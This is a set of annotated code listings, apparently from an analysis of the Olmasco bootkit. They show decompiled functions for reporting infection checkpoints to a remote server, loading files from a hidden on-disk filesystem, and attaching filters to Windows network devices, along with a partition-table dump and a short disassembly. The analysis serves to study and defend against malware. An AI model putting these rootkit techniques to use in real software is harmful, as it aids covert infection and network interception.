["```\nHINTERNET __cdecl ReportCheckPoint(int check_point_code){\n\n  char query_string[0x104];\n\n  memset(&query_string, 0, 0x104u);\n\n➊ _snprintf(\n\n    &query_string,\n\n    0x104u,\n\n    \"/testadd.php?aid=%s&sid=%s&bid=%s&mode=%s%u%s%s\",\n\n    *FILE_affid,\n\n    *FILE_subid,\n\n    &bid,\n\n    \"check_point\",\n\n    check_point_code,\n\n    &bid,\n\n    &bid);\n\n➋ return SendDataToServer(0, &query_string, \"GET\", 0, 0);\n\n}\n```", "```\nFirst partition                     00212000    0C13DF07    00000800    00032000\n\nSecond partition (OS)               0C14DF00    FFFFFE07    00032800    00FCC800\n\nThird partition (Olmasco), Active   FFFFFE80    FFFFFE1B  ➊00FFF000  ➋00000FB0\n\nFourth partition (empty)            00000000    00000000    00000000    00000000\n```", "```\nseg000:01F4                 hlt\n\nseg000:01F4 sub_195         endp\n\nseg000:01F5                 jmp     short loc_1F4\n\nseg000:01F7 aBoot         ➊ db '\\boot',0\n\nseg000:01FD                 db    0\n```", "```\nunsigned int stdcall RkFsLoadFile(FS_DATA_STRUCT *a1, PDEVICE_OBJECT\n\n  DeviceObject, const char *FileName, FS_LIST_ENTRY_STRUCT *FileEntry)\n\n{\n\n  unsigned int result;\n\n  // locate file in the root dir\n\n➊ result = RkFsLocateFileInDir(&a1->root_dir, FileName, FileEntry);\n\n  if ( (result & 0xC0000000) != 0xC0000000 ) {\n\n    // read the file from the hard drive\n\n  ➋ result = RkFsReadFile(a1, DeviceObject, FileEntry);\n\n    if ( (result & 0xC0000000) != 0xC0000000 ) {\n\n      // verify file integrity\n\n    ➌ result = RkFsCheckFileCRC32(FileEntry);\n\n      if ( result == 0xC000003F ) {\n\n        // free occupied sectors\n\n      ➍ MarkBadSectorsAsFree(a1, FileEntry->pFileEntry);\n\n        // remove corresponding entry\n\n        RkFsRemoveFile(a1, &a1->root_dir, FileEntry->pFileEntry->FileName);\n\n        RkFsFreeFileBuffer(FileEntry);\n\n        // update directory\n\n        RkFsStoreFile(a1, DeviceObject, &a1->root_dir);\n\n        RkFsStoreFile(a1, DeviceObject, &a1->bad_file);\n\n        // update bitmap of occupied sectors\n\n        RkFsStoreFile(a1, DeviceObject, &a1->bitmap_file);\n\n        // update root directory\n\n        RkFsStoreFile(a1, DeviceObject, &a1->root);\n\n        result = 0xC000003F;\n\n      }\n\n    }\n\n  }\n\n  return result;\n\n}\n```", "```\nNTSTATUS ___stdcall_ AttachToNetworkDevices(PDRIVER_OBJECT DriverObject,\n\n                                   PUNICODE_STRING a2)\n\n{\n\n  NTSTATUS result;\n\n  PDEVICE_OBJECT AttachedToTcp;\n\n  PDEVICE_OBJECT AttachedToUdp;\n\n  PDEVICE_OBJECT AttachedToIp;\n\n  PDEVICE_OBJECT AttachedToRawIp;\n\n  result = AttachToDevice(DriverObject, L\"\\\\Device\\\\CFPTcpFlt\",\n\n                           ➊ L\"\\\\Device\\\\Tcp\", 0xF8267A6F, &AttachedToTcp);\n\n  if ( result >= 0 ) {\n\n    result = AttachToDevice(DriverObject, L\"\\\\Device\\\\CFPUdpFlt\",\n\n                           ➋ L\"\\\\Device\\\\Udp\", 0xF8267AF0, &AttachedToUdp);\n\n    if ( result >= 0 ) {\n\n      AttachToDevice(DriverObject, L\"\\\\Device\\\\CFPIpFlt\",\n\n                           ➌ L\"\\\\Device\\\\Ip\", 0xF8267A16, &AttachedToIp);\n\n      AttachToDevice(DriverObject, L\"\\\\Device\\\\CFPRawFlt\",\n\n                           ➍ L\"\\\\Device\\\\RawIp\", 0xF8267A7E, &AttachedToRawIp);\n\n      result = 0;\n\n    }\n\n  }\n\n  return result;\n\n}\n```"]